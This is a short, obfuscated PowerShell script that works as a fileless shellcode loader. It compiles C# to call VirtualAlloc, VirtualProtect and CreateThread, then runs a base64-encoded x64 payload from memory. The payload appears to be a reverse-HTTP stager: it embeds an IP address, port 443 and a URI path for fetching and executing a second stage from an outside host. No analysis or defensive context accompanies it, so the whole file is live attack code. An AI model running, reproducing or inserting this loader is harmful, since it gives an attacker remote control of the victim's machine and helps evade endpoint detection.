Set-StrictMode -Version 2
$wh5P = @"
        using System;
        using System.Runtime.InteropServices;
        namespace r97 {
                public class func {
                        [Flags] public enum AllocationType { Commit = 0x1000, Reserve = 0x2000 }
                        [Flags] public enum MemoryProtection { ReadWrite = 0x04, Execute= 0x10 }
                        [Flags] public enum Time : uint { Infinite = 0xFFFFFFFF }
                        [DllImport("kernel32.dll")] public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);
                        [DllImport("kernel32.dll")] public static extern bool VirtualProtect(IntPtr lpAddress, int dwSize, int flNewProtect,out int lpflOldProtect);
                        [DllImport("kernel32.dll")] public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);
                        [DllImport("kernel32.dll")] public static extern int WaitForSingleObject(IntPtr hHandle, Time dwMilliseconds);
                }
        }
"@

 

$wE5 = New-Object Microsoft.CSharp.CSharpCodeProvider
$qmwv = New-Object System.CodeDom.Compiler.CompilerParameters
$qmwv.ReferencedAssemblies.AddRange(@("System.dll", [PsObject].Assembly.Location))
$qmwv.GenerateInMemory = $True
$mhN = $wE5.CompileAssemblyFromSource($qmwv, $wh5P)

 

[Byte[]]$jwK = [System.Convert]::FromBase64String("/EiD5PDozAAAAEFRQVBSUVZIMdJlSItSYEiLUhhIi1IgTTHJSItyUEgPt0pKSDHArDxhfAIsIEHByQ1BAcHi7VJBUUiLUiCLQjxIAdBmgXgYCwIPhXIAAACLgIgAAABIhcB0Z0gB0ESLQCBJAdCLSBhQ41ZNMclI/8lBizSISAHWSDHArEHByQ1BAcE44HXxTANMJAhFOdF12FhEi0AkSQHQZkGLDEhEi0AcSQHQQYsEiEFYQVhIAdBeWVpBWEFZQVpIg+wgQVL/4FhBWVpIixLpS////11IMdtTSb53aW5pbmV0AEFWSInhScfCTHcmB//VU1NIieFTWk0xwE0xyVNTSbo6VnmnAAAAAP/V6A0AAAA4Ni4xNTIuMTgyLjQAWkiJwUnHwLsBAABNMclTU2oDU0m6V4mfxgAAAAD/1eiwAAAAL2hoZE5qMTNQeWNHcGo2aU56YUlzMUFTRWtwMEhqVUk4R01ESVFHVDdINW0yT3YwNUR3d2RJUVRhNE9YLUlnb0N4dXp4eXBZanFrZmdhamprNmNBTWRpVnphV2M1OUxaLVBod1VKeEtmd1NGbGE2Si1ONVFJb1Rpa2xrLWpBbWc1X291QTZhM2FaNVlYZDV3QTZBSmRpRFNGaXY0SkpRQ2xSQ0NVM043U296X2UzegBIicFTWkFYTTHJU0i4ADKohAAAAABQU1NJx8LrVS47/9VIicZqCl9IifFqH1pSaIAzAABJieBqBEFZSbp1Rp6GAAAAAP/VTTHAU1pIifFNMclNMclTU0nHwi0GGHv/1YXAdR9Ix8GIEwAASbpE8DXgAAAAAP/VSP/PdALrquhVAAAAU1lqQFpJidHB4hBJx8AAEAAASbpYpFPlAAAAAP/VSJNTU0iJ50iJ8UiJ2knHwAAgAABJiflJuhKWieIAAAAA/9VIg8QghcB0smaLB0gBw4XAddJYw1hqAFlJx8LwtaJW/9U=")
[Uint32]$t_46 = 0

 

$dy3z = [r97.func]::VirtualAlloc(0, $jwK.Length + 1, [r97.func+AllocationType]::Reserve -bOr [r97.func+AllocationType]::Commit, [r97.func+MemoryProtection]::ReadWrite)
if ([Bool]!$dy3z) { $global:result = 3; return }
[System.Runtime.InteropServices.Marshal]::Copy($jwK, 0, $dy3z, $jwK.Length)

 

if ([r97.func]::VirtualProtect($dy3z,[Uint32]$jwK.Length + 1, [r97.func+MemoryProtection]::Execute, [Ref]$t_46) -eq $true ) {
        [IntPtr] $f0 = [r97.func]::CreateThread(0,0,$dy3z,0,0,0)
        if ([Bool]!$f0) { $global:result = 7; return }
        $lBj = [r97.func]::WaitForSingleObject($f0, [r97.func+Time]::Infinite)
}
